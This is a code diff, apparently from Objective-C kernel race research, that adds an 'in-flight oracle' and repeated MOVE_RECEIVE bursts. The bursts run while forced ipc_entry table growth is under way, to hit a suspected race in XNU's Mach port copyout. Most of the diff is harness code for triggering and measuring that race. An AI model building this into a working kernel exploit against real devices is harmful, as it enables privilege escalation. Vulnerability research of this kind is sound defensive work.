@@ -190,6 +190,18 @@ static kern_return_t ensure_send_right(mach_port_t port) {
         }
         return result;
     }
+    // In-flight oracle (ollie): between send and receive the RECEIVE right sits
+    // in imq_messages — mach_port_type must show the RECEIVE bit GONE from our
+    // is_table entry. After receive the bit comes back, so post-recv checks
+    // always read 0 mutations. Measure HERE.
+    uint32_t inFlight = 0;
+    for (uint32_t i = 0; i < count; i++) {
+        if (aux[i] == MACH_PORT_NULL) continue;
+        mach_port_type_t pt = 0;
+        kern_return_t tk = mach_port_type(mach_task_self(), aux[i], &pt);
+        if (tk != KERN_SUCCESS || (pt & MACH_PORT_TYPE_RECEIVE) == 0) inFlight++;
+    }
+    result[@"inflight_recv_bit_cleared"] = @(inFlight);
     size_t rcvTotal = total + 64;
     uint8_t *rcv = calloc(1, rcvTotal);
     mach_msg_header_t *rh = (mach_msg_header_t *)rcv;
@@ -313,6 +325,7 @@ static kern_return_t ensure_send_right(mach_port_t port) {
             @"send_kr": message[@"send_kr"] ?: @(-1),
             @"recv_kr": message[@"recv_kr"] ?: @(-1),
             @"recv_desc_count": message[@"recv_desc_count"] ?: @0,
+            @"inflight_recv_bit_cleared": message[@"inflight_recv_bit_cleared"] ?: @0,
             @"destroy_failures": @(destroyFailures), @"after_free": afterFree,
             @"inuse_restored": @([afterFree[@"table_inuse"] unsignedIntValue] == beforeInUse),
         }];
@@ -693,10 +706,19 @@ static kern_return_t ensure_send_right(mach_port_t port) {
         for (NSNumber *np in scratch) mach_port_destroy(mach_task_self(), (mach_port_t)np.unsignedIntValue);
     });
 
-    NSDictionary *raceBurst = [self sendReceiveMoveBurst:64 port:port];
+    // Three bursts while churn forces grow_table — each receive of 32
+    // MOVE_RECEIVE names allocates 32 fresh ipc_entries inside copyout, so the
+    // boundary crossing happens in the copyout window (ollie's race shape).
+    int totalInflight = 0;
+    for (int br = 0; br < 3; br++) {
+        NSDictionary *raceBurst = [self sendReceiveMoveBurst:32 port:port];
+        [report appendFormat:@"race burst[%d]: send=%@ recv=%@ inflight_cleared=%@\n",
+         br, raceBurst[@"send_kr"], raceBurst[@"recv_kr"], raceBurst[@"inflight_recv_bit_cleared"]];
+        totalInflight += [raceBurst[@"inflight_recv_bit_cleared"] intValue];
+    }
     churnRun = 0;
     usleep(80000); // let the churn loop drain its scratch list
-    [report appendFormat:@"race burst: %@\n", raceBurst];
+    [report appendFormat:@"race inflight recv-bit cleared: %d (ollie in-flight oracle)\n", totalInflight];
     NSDictionary *postRace = [self portSpaceBasicSnapshot];
     [report appendFormat:@"post-race: size=%u inuse=%u grew=%d\n",
      [postRace[@"table_size"] unsignedIntValue], [postRace[@"table_inuse"] unsignedIntValue],
